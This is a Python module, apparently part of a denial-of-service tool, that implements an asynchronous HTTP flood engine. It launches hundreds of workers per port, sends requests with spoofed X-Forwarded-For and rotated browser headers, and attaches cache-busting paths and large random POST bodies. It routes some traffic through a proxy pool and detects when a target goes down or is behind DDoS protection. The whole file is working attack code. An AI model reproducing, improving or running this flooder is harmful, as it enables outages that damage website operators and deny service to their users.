import asyncio
import random
import string
import time
from typing import Optional
from urllib.parse import urlparse

import aiohttp
from aiohttp_socks import ProxyConnector

from models import AttackMethod, AttackStats, AttackStatus, PortStats, PortStatus
from proxy_pool import proxy_pool
from target_monitor import monitor
from config import settings

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) AppleWebKit/605.1.15 Version/17.5 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/124.0.0.0",
]
REF = ["https://google.com/search?q=", "https://bing.com/search?q=", "https://duckduckgo.com/?q=",
       "https://yandex.ru/search/?text=", "https://reddit.com/", "https://github.com/"]
PATHS = ["/", "/index.html", "/login", "/api/", "/admin", "/wp-admin", "/search?q=",
         "/api/v1/users", "/graphql", "/xmlrpc.php", "/.env", "/config.json",
         "/api/status", "/health", "/dashboard", "/register"]
_c = string.ascii_letters + string.digits

_JUNK = ["".join(random.choices(_c, k=50000)) for _ in range(10)]

WORKERS_PER_PORT = 200


def _j(lo=3, hi=12):
    return "".join(random.choices(_c, k=random.randint(lo, hi)))

def _h():
    return {"User-Agent": random.choice(UA), "Accept": "text/html,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br", "Referer": random.choice(REF) + _j(5, 15),
            "Cache-Control": "no-cache", "Connection": "keep-alive",
            "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"}

def _p():
    return {_j(5, 10): random.choice(_JUNK)[:random.randint(20000, 50000)]
            for _ in range(random.randint(3, 8))}

def _m(m):
    return random.choice(["GET", "POST", "HEAD"]) if m == AttackMethod.MIX else m.value

def _url(target, port):
    parsed = urlparse(target)
    host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    if port == 443: return f"https://{host}"
    elif port == 80: return f"http://{host}"
    return f"https://{host}:{port}"

def _bust(base):
    path = random.choice(PATHS)
    sep = "&" if "?" in path else "?"
    return f"{base}{path}{sep}{_j(3,6)}={_j(8,16)}"


class AttackEngine:
    def __init__(self):
        self.stats = AttackStats()
        self._stop = asyncio.Event()
        self._task: Optional[asyncio.Task] = None
        self.last_error: str = ""

    @property
    def is_running(self):
        return self._task is not None and not self._task.done()

    async def start(self, target, ports, method, threads, duration, use_proxies):
        if self.is_running:
            await self.stop()
        self._stop.clear()
        self.last_error = ""
        self.stats = AttackStats(
            target=target, method=method.value, status=AttackStatus.RUNNING,
            ports={p: PortStats(port=p, status=PortStatus.ALIVE) for p in ports},
            threads=threads, started_at=time.time(),
            proxies_loaded=proxy_pool.count if use_proxies else 0,
        )
        parsed = urlparse(target)
        host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
        monitor.start(host, ports[0])
        self._task = asyncio.create_task(self._run(target, ports, method, threads, duration, use_proxies))

    async def stop(self):
        if not self.is_running:
            return
        self.stats.status = AttackStatus.STOPPING
        self._stop.set()
        monitor.stop_sync()
        if self._task:
            try:
                await asyncio.wait_for(self._task, timeout=5.0)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                self._task.cancel()
        self.stats.status = AttackStatus.FINISHED

    async def _run(self, target, ports, method, threads, duration, use_proxies):
        deadline = time.time() + duration if duration > 0 else 0
        workers_pp = min(WORKERS_PER_PORT, threads // max(len(ports), 1))
        workers_pp = max(workers_pp, 50)

        tasks = []
        for p in ports:
            tasks.append(asyncio.create_task(
                self._port_flood(target, p, method, workers_pp, deadline, use_proxies)))
        tasks.append(asyncio.create_task(self._health_loop(target)))

        await asyncio.gather(*tasks, return_exceptions=True)

        if self.stats.status == AttackStatus.RUNNING:
            if all(ps.status != PortStatus.ALIVE for ps in self.stats.ports.values()):
                self.stats.status = AttackStatus.ALL_DOWN
            else:
                self.stats.status = AttackStatus.FINISHED
        self.stats = self.stats.snapshot()

    async def _port_flood(self, target, port, method, num_workers, deadline, use_proxies):
        base = _url(target, port)
        d_timeout = aiohttp.ClientTimeout(total=settings.request_timeout, connect=3)
        p_timeout = aiohttp.ClientTimeout(total=settings.proxy_timeout, connect=2)

        d_conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
        d_session = aiohttp.ClientSession(connector=d_conn, timeout=d_timeout)

        try:
            workers = []
            for i in range(num_workers):
                use_px = use_proxies and (i % 5 >= 2)
                workers.append(asyncio.create_task(
                    self._worker(d_session, base, port, method, deadline, use_px, p_timeout, i)))
                if i % 50 == 49:
                    await asyncio.sleep(0)
            await asyncio.gather(*workers, return_exceptions=True)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            self.last_error = f"Port {port}: {e}"
        finally:
            await d_session.close()

    async def _worker(self, d_session, base, port, method, deadline, use_px, p_timeout, wid):
        await asyncio.sleep(wid * 0.01)
        while not self._stop.is_set():
            if deadline and time.time() >= deadline:
                break
            ps = self.stats.ports.get(port)
            if not ps or ps.status != PortStatus.ALIVE:
                await asyncio.sleep(0.5)
                continue
            if use_px and proxy_pool.alive_count < 50:
                use_px = False
            try:
                if use_px:
                    await self._fire_proxy(base, port, method, p_timeout)
                else:
                    await self._fire_direct(d_session, base, port, method)
            except Exception:
                pass

    async def _fire_direct(self, session, base, port, method):
        ps = self.stats.ports.get(port)
        if not ps:
            return
        m = _m(method)
        kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
        if m == "POST":
            kw["json"] = _p()
        try:
            async with session.request(**kw) as resp:
                await resp.read()
                self._hit(ps, resp.status, resp.headers, True)
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
            self._miss(ps, True)

    async def _fire_proxy(self, base, port, method, timeout):
        ps = self.stats.ports.get(port)
        if not ps:
            return
        px = proxy_pool.random()
        if not px:
            return
        m = _m(method)
        kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
        if m == "POST":
            kw["json"] = _p()
        try:
            conn = ProxyConnector.from_url(px, ssl=False)
            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
                async with s.request(**kw) as resp:
                    await resp.read()
                    self._hit(ps, resp.status, resp.headers, False)
                    proxy_pool.mark_alive(px)
        except Exception:
            self._miss(ps, False)
            proxy_pool.mark_dead(px)

    def _hit(self, ps, status, headers, is_direct):
        ps.total_requests += 1
        ps.status_codes[status] = ps.status_codes.get(status, 0) + 1
        ps.last_response_time = time.time()
        self.stats.total_requests += 1
        ps.successful += 1
        self.stats.successful += 1
        if is_direct:
            ps.consecutive_fails = 0
        srv = (headers.get("server") or "").lower()
        if "cloudflare" in srv or "ddos-guard" in srv:
            ps.status = PortStatus.PROTECTED

    def _miss(self, ps, is_direct):
        ps.total_requests += 1
        ps.failed += 1
        self.stats.total_requests += 1
        self.stats.failed += 1
        if is_direct:
            ps.consecutive_fails += 1

    async def _health_loop(self, target):
        await asyncio.sleep(10)
        timeout = aiohttp.ClientTimeout(total=4, connect=3)
        while not self._stop.is_set():
            for port, ps in list(self.stats.ports.items()):
                if ps.status != PortStatus.ALIVE:
                    continue
                url = _url(target, port)
                alive = False
                try:
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False), timeout=timeout) as s:
                        async with s.get(url, headers=_h(), ssl=False) as r:
                            alive = True
                except Exception:
                    pass
                if not alive and ps.consecutive_fails >= 50:
                    ps.status = PortStatus.DOWN
            if all(ps.status != PortStatus.ALIVE for ps in self.stats.ports.values()):
                self._stop.set()
                self.stats.status = AttackStatus.ALL_DOWN
                break
            await asyncio.sleep(10)


engine = AttackEngine()
